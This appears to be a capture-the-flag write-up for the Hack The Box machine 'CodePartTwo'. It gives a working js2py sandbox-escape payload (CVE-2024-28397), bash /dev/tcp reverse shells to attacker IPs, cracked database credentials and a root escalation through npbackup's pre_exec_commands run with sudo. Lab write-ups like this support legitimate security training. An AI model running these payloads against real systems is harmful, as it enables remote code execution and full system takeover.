+++
title = "HTB - CodePartTwo"
tags = ["writeup"]
date = 2025-10-30
authors = ["Aniko"]
+++

CodePartTwo is the sequel of "Code". In the Code machine to pwn it,
you had to discover global variables and use them
to get data from the backend server, or, if necessary, import and execute commands.

# Recon

`nmap -sC -sS -O -T4 -A -oN scan.txt 10.10.11.82`

```
Nmap scan report for 10.10.11.82
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```
We have some TCP ports: *22* and *8000*. Now we need to focus to **8000 HTTP**.

And we have a website with 3 buttons:
- Login
- Register
- Download app

![Front webpage](/images/CodePartTwoWP.png)

If we click to Download app, the webapp gives to us a zip named `app.zip` (**This is the codebase of webapp**)
![The proof of download](/images/CodePartTwoDownload.png)

After unzip it we get some files

```
app/
├── app.py
├── index.html
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html
```
## Important things

- `app.py` is the entrypoint
- `instance/users.db` the database of webapp

## Testing in local

Now we can test it in local, so we need to install requirements (`pip install -r requirements.txt`).

To run the webapp, we need to run: `python app.py`

```
RuntimeError: Your python version made changes to the bytecode
```

## Troubleshooting Python

Why we get `RuntimeError: Your python version made changes to the bytecode`?
Into the traceback we can read the error comes from *js2py*

```
  File "/home/aniko/.local/lib/python3.13/site-packages/js2py/utils/injector.py", line 264, in <module>
    check(six.get_function_code(check))
    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/aniko/.local/lib/python3.13/site-packages/js2py/utils/injector.py", line 251, in check
    raise RuntimeError(
        'Your python version made changes to the bytecode')
RuntimeError: Your python version made changes to the bytecode
```

And if we watch upper can see that error comes from
```
  File "/home/aniko/Documents/ctf/HTB/CodePartTwo/app/app.py", line 4, in <module>
    import js2py
```
So we need to change the python version, [latest supported version is Python 3.11/3.12](https://github.com/PiotrDabkowski/Js2Py/issues/282#issuecomment-2022211399).
To be sure i didn't make a mistake, i decided to use **Python 3.11**.

To install *Python 3.11* to avoid making a mess, [you can install it with *PyEnv*](https://github.com/pyenv/pyenv)

```
pyenv install 3.11
pyenv local 3.11
```

Now we have the executable in local env, and we can run
```
python3.11 -m pip install -r requirements.txt
python3.11 app.py
```

We finally troubleshooted!

## Into the local environment

Now we can Register and Login into it.

This is the code editor, where we can execute JS code
![The code editor](/images/CodePartTwoCode.png)

## Searching bugs into the code

```py
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code) # <--- We can exploit `eval_js`
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

Into `app.py` on `run_code` function we can see how the JS code is initiated.

If we search about *js2py* and `eval_js` func, some result comes.

1. [SPLOITUS - Exploit for CVE-2024-28397](https://sploitus.com/exploit?id=B2D67207-FDF4-57B3-B988-6C0DAD550C22)
2. [Marven11/CVE-2024-28397-js2py-Sandbox-Escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

# Exploitation (CVE-2024-28397)

This my custom POC, with little fixes

```js
// [+] command goes here:
let cmd = "echo Pwned by Aniko33 "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
    let f;
    let result;
    for(let i in obj.__subclasses__()) {
        f = obj.__subclasses__()[i]
        if(f.__module__ == "subprocess" && f.__name__ == "Popen") {
            result = f;
            break;
        }
    }

console.log(result(cmd, -1, null, -1, -1, -1, null, null, true).communicate())
```

![POC](/images/CodePartTwoEcho.png)

Now we know that payload works, so, now we can exploit the real application

## Listener

```
nc -lvnp 4444
```

## Payload
```js
// [+] command goes here:
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.192/4444 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__
    let f;
    let result;
    for(let i in obj.__subclasses__()) {
        f = obj.__subclasses__()[i]
        if(f.__module__ == "subprocess" && f.__name__ == "Popen") {
            result = f;
            break;
        }
    }

console.log(result(cmd, -1, null, -1, -1, -1, null, null, true).communicate())
```

![Reverse shell](/images/CodePartTwoShell.png)

# Priv.Esc to user

## Enum all accessible users
```
app@codeparttwo:~/app/instance$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

marco, root and app are main users of the system; This is fundamental step.

## Gain the credentials

The website contains a database, we can search on it for gain some credentials.

```
app@codeparttwo:~/app/instance$ sqlite3 -batch users.db ".tables" 
code_snippet  user
app@codeparttwo:~/app/instance$ sqlite3 -batch users.db "SELECT * FROM user;"
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
...
```

Now we get some credentials, is time do brute-force user marco.

I suggest to use [CrackStation](https://crackstation.net/) to brute-force CTF flags.

![CrackedHash](/images/CodePartTwoHash.png)

Credentials: `marco:sweetangelbabylove`

## Access to the user

`ssh marco@10.10.11.82` and we use as password `sweetangelbabylove`.
**And we get the first flag**.

# Priv.Esc to root

## `sudo -l`

With `sudo -l` we can know that user "marco" can run *npbackup-cli* as root.
This is the priv.esc vector

```
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

And into the home of marco we can see this config files.

```
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
```

## npbackup-cli

> **A secure and efficient file backup solution that fits both system administrators (CLI) and end users (GUI)**

We can exploit it to take root priv. How? By hijacking the config file to dump or execute some commands as root.

```
marco@codeparttwo:~$ cat npbackup.conf | grep command
      stdin_from_command:
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      repo_password_command:
```

Into the config file is present a important key: *pre_exec_commands*. Can be used to execute commands before the backup

```
cp npbackup.conf /tmp
```
And i have modified `/tmp/npbackup.conf`

```
...
pre_exec_commands: ["bash -c 'bash -i >& /dev/tcp/10.10.14.94/4444 0>&1'"]
...
```

Is time to backup!

```
sudo npbackup-cli --backup --config npbackup.conf --force
```

`--force` is needed to bypass recent backup time

Now we are **root**!

![root!](/images/CodePartTwoRoot.png)
